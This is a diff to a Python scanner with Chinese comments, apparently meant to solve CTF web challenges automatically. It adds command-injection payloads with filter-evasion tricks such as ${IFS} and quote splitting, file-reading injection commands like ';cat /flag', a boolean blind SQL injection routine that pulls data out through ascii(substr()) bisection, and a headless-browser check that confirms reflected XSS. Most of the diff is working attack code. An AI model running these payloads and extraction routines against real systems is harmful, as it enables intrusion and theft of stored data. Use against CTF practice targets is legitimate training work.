@@ -15,6 +15,9 @@
 """
 import base64
 import http.client
+import subprocess
+import sys
+import tempfile
 import json
 import os
 import random
@@ -68,7 +71,11 @@ SSTI_CASES = [
 ]
 CMDI_PROBE = "CTFBOX9137"
 CMDI_PAYLOADS = [";echo CTFBOX$((9137+1))", "|echo CTFBOX$((9137+1))",
-                 "$(echo CTFBOX$((9137+1)))"]
+                 "$(echo CTFBOX$((9137+1)))",
+                 ";echo${IFS}CTFBOX$((9137+1))",
+                 "|echo${IFS}CTFBOX$((9137+1))",
+                 "%0aecho CTFBOX$((9137+1))",
+                 ";e'c'h'o' CTFBOX$((9137+1))"]
 CMDI_EXPECT = "CTFBOX9138"
 TRAVERSAL_PAYLOADS = [
     "file:///var/www/html/flag.php",
@@ -458,6 +465,71 @@ def _differs(a, b):
 # ---------------------------------------------------------------------------
 # 各类 payload 矩阵
 # ---------------------------------------------------------------------------
+BLIND_FLAG_EXPRS = ("select flag from flag", "select group_concat(flag) from flag",
+                     "select flag from flag_table", "select group_concat(flag) from flag_table")
+
+
+def _blind_payload(expr, quote):
+    return ("1' AND (%s)-- -" % expr) if quote else ("1 AND (%s)" % expr)
+
+
+SQL_ERR_WORDS = ("query_error", "error", "失败", "错误", "不存在", "invalid", "no result")
+
+
+def _sql_bool_true(item, false_item):
+    """布尔注入判真：先看语义标记，再看响应差异。
+
+    靶场会把整条 SQL 原样回显，payload 越长时间越长——直接比长度会把
+    每一发都判成“有差异”，二分永远停在 127。所以 query_error 一律判假。
+    """
+    a = text_of(item).lower()
+    if any(w in a for w in SQL_ERR_WORDS):
+        return False
+    if any(w in a for w in ("query_success", "success", "成功")):
+        return True
+    return _differs(item, false_item)
+
+
+def sqli_blind_dump(ctx, target, quote):
+    """布尔盲注取数：用 ascii(substr(...)) 二分，逐字符恢复 flag。
+
+    只发 SELECT 条件，不写库；预算不足时直接放弃，不拖垮整轮。
+    """
+    remaining = ctx.budget.max_requests - ctx.budget.used
+    max_chars = min(46, (remaining - 30) // 7)
+    if max_chars < 12:
+        return []
+    false_item = send_value(ctx, target, ("1' AND 1=2-- -" if quote else "1 AND 1=2"))
+    for expr in BLIND_FLAG_EXPRS:
+        got = ""
+        for pos in range(1, max_chars + 1):
+            if ctx.budget.used + 8 >= ctx.budget.max_requests:
+                return []
+            lo, hi = 31, 127
+            while lo < hi:
+                mid = (lo + hi) // 2
+                cond = "ascii(substr((%s),%d,1))>%d" % (expr, pos, mid)
+                item = send_value(ctx, target, _blind_payload(cond, quote))
+                if _sql_bool_true(item, false_item):
+                    lo = mid + 1
+                else:
+                    hi = mid
+            ch = chr(lo)
+            if ch == "}" and "{" in got:
+                got += ch
+                break
+            if ch in "{}" or (ch.isprintable() and ch not in " "):
+                got += ch
+            else:
+                break
+            if not got[:1].isalnum() and got[:1] != "{":
+                break
+        if re.search(r"(?:ctfhub|flag)\{[^}]+\}", got):
+            ctx.log("[deep] 布尔盲注恢复：%s" % got)
+            return [got]
+    return []
+
+
 def test_sqli(ctx, target):
     base_item = send_value(ctx, target, target["value"])
     base_text = text_of(base_item).lower()
@@ -473,17 +545,23 @@ def test_sqli(ctx, target):
     # 2) 布尔型：1=1 与 1=2 响应必须有实质差异。
     #    字符串型用 `1' AND ...`，数字型用 `1 AND ...`；两种都测，否则数字型参数永远测不出来。
     quote = False
+    boolean_hit = False
     for pair in (SQLI_BOOL_PAIR, SQLI_BOOL_PAIR_NUM):
         truthy = send_value(ctx, target, pair[0])
         falsy = send_value(ctx, target, pair[1])
-        if _differs(truthy, falsy):
+        if _sql_bool_true(truthy, falsy):
             quote = pair is SQLI_BOOL_PAIR
+            boolean_hit = True
             ctx.add("sqli-boolean", truthy["url"],
                     payload="%s / %s" % pair,
                     evidence="真/假条件响应不同（%d vs %d 字节）"
                              % (len(truthy.get("body") or b""), len(falsy.get("body") or b"")),
                     confidence="medium")
             break
+    # 2.5) 布尔盲注取数：确认布尔成立后立刻二分跑字符，避免 UNION 先吃掉预算
+    if boolean_hit:
+        for flag in sqli_blind_dump(ctx, target, quote):
+            ctx._add_flag(flag, target["url"] if isinstance(target, dict) else ctx.url)
     # 3) 时间型（默认开启，两次 SLEEP(3) 最多花 6 秒）
     if ctx.allow_time:
         for payload, secs in SQLI_TIME_PAYLOADS:
@@ -645,6 +723,63 @@ def sqli_error_dump(ctx, target):
     return False
 
 
+_XSS_BROWSER_JS = r"""
+import sys
+from playwright.sync_api import sync_playwright
+u = sys.argv[1]
+hit = []
+with sync_playwright() as pw:
+    b = pw.chromium.launch(headless=True, args=["--no-sandbox"])
+    pg = b.new_page()
+    def on_dialog(d):
+        hit.append(1)
+        try:
+            d.dismiss()
+        except Exception:
+            pass
+    pg.on("dialog", on_dialog)
+    try:
+        pg.goto(u, timeout=8000, wait_until="domcontentloaded")
+    except Exception:
+        pass
+    pg.wait_for_timeout(1400)
+    b.close()
+print("XSS_DIALOG" if hit else "XSS_NONE")
+"""
+
+
+def browser_xss_confirm(url, timeout=22):
+    """用本机 Playwright 真跑一次页面，看 alert 是否弹出。
+
+    便携 exe 自身没有 playwright 时，退回到 D:\\PY\\python.exe；两者都没有就
+    返回 False，保持“只检测不夸口”的口径。
+    """
+    py = None
+    if not getattr(sys, "frozen", False):
+        py = sys.executable
+    else:
+        for cand in (os.environ.get("MOHE_PYTHON"), r"D:\PY\python.exe"):
+            if cand and os.path.isfile(cand):
+                py = cand
+                break
+    if not py:
+        return False
+    fd, path = tempfile.mkstemp(suffix=".py", prefix="mohe_xss_")
+    try:
+        with os.fdopen(fd, "w", encoding="utf-8") as f:
+            f.write(_XSS_BROWSER_JS)
+        out = subprocess.run([py, path, url], capture_output=True, text=True,
+                             timeout=timeout, encoding="utf-8", errors="ignore")
+        return "XSS_DIALOG" in (out.stdout or "")
+    except Exception:
+        return False
+    finally:
+        try:
+            os.remove(path)
+        except Exception:
+            pass
+
+
 def test_xss(ctx, target):
     for payload in XSS_PAYLOADS:
         item = send_value(ctx, target, payload)
@@ -654,6 +789,12 @@ def test_xss(ctx, target):
             near = text[max(0, idx - 40):idx + len(payload) + 40]
             ctx.add("xss-reflected", item["url"], payload=payload,
                     evidence="payload 原样回显（上下文）：" + _snippet(near, 160))
+            if payload.startswith("<script>") and not getattr(ctx, "_xss_browser", False):
+                ctx._xss_browser = True
+                if browser_xss_confirm(item["url"]):
+                    ctx.add("xss-exec", item["url"], payload=payload,
+                            evidence="Playwright 实际打开页面，alert 弹窗触发（浏览器确证）")
+                    ctx.log("[deep] XSS 浏览器确证：alert 已执行")
             return
         if "&lt;script" in text or "&lt;img" in text:
             ctx.add("xss-escaped", item["url"], payload=payload,
@@ -823,7 +964,9 @@ def test_login(ctx, fp):
     return hits
 
 
-CMDI_FLAG_CMDS = [";cat /flag", ";cat /flag.txt", ";cat /flag.php",
+CMDI_FLAG_CMDS = [";cat /flag", ";cat$IFS/flag", ";tac /flag", ";head -n1 /flag",
+                  "/bin/cat /flag", ";c'a't /flag", ";cat /var/www/html/flag.php",
+                  ";cat /flag.txt", ";cat /flag.php",
                   ";cat /root/flag.txt", ";cat /flag_is_here", ";ls /",
                   ";ls -la /var/www/html", ";ls -la /home",
                   ";find /var/www -maxdepth 3 -type f",
@@ -849,17 +992,18 @@ B64_RE = re.compile(r"[A-Za-z0-9+/]{20,}={0,2}")
 
 
 def _b64_flags(body):
-    """命令回显里常出现 base64（cat 二进制/防转义），解一层再扫 flag。"""
-    found = False
+    """命令回显里常出现 base64（cat 二进制/防转义），解一层再扫 flag，返回命中的 flag 列表。"""
+    out = []
     for tok in B64_RE.findall(body)[:40]:
         try:
             raw = base64.b64decode(tok + "=" * (-len(tok) % 4))
         except Exception:
             continue
         if b"ctfhub{" in raw or b"flag{" in raw:
-            if collect_flags(raw.decode("utf-8", "ignore")):
-                found = True
-    return found
+            for flag in collect_flags(raw.decode("utf-8", "ignore")):
+                if flag not in out:
+                    out.append(flag)
+    return out
 
 
 def _cmdi_php_files(body):
@@ -875,7 +1019,10 @@ def cmdi_read_flag(ctx, target):
             continue
         body = text_of(item)
         block = _cmdi_block(body)
-        if collect_flags(block) or _b64_flags(block):
+        flags = collect_flags(block) + _b64_flags(block)
+        if flags:
+            for flag in flags:
+                ctx._add_flag(flag, target["url"] if isinstance(target, dict) else ctx.url)
             ctx.log("[deep] 命令注入读 flag 成功：%s" % cmd)
             return True
         if cmd == ";ls /":
@@ -887,12 +1034,18 @@ def cmdi_read_flag(ctx, target):
         if cmd.startswith(";ls -la /var/www"):
             for name in _cmdi_php_files(block):
                 for c2 in (";cat /var/www/html/" + name,
-                           ";base64 /var/www/html/" + name):
+                           ";base64 /var/www/html/" + name,
+                           ";tac /var/www/html/" + name,
+                           ";sort /var/www/html/" + name,
+                           ";nl /var/www/html/" + name):
                     item3 = send_value(ctx, target, "127.0.0.1" + c2)
                     if not item3:
                         continue
                     b3 = _cmdi_block(text_of(item3))
-                    if collect_flags(b3) or _b64_flags(b3):
+                    flags3 = collect_flags(b3) + _b64_flags(b3)
+                    if flags3:
+                        for flag in flags3:
+                            ctx._add_flag(flag, target["url"] if isinstance(target, dict) else ctx.url)
                         ctx.log("[deep] 命令注入读 flag 成功：%s" % c2)
                         return True
     return False
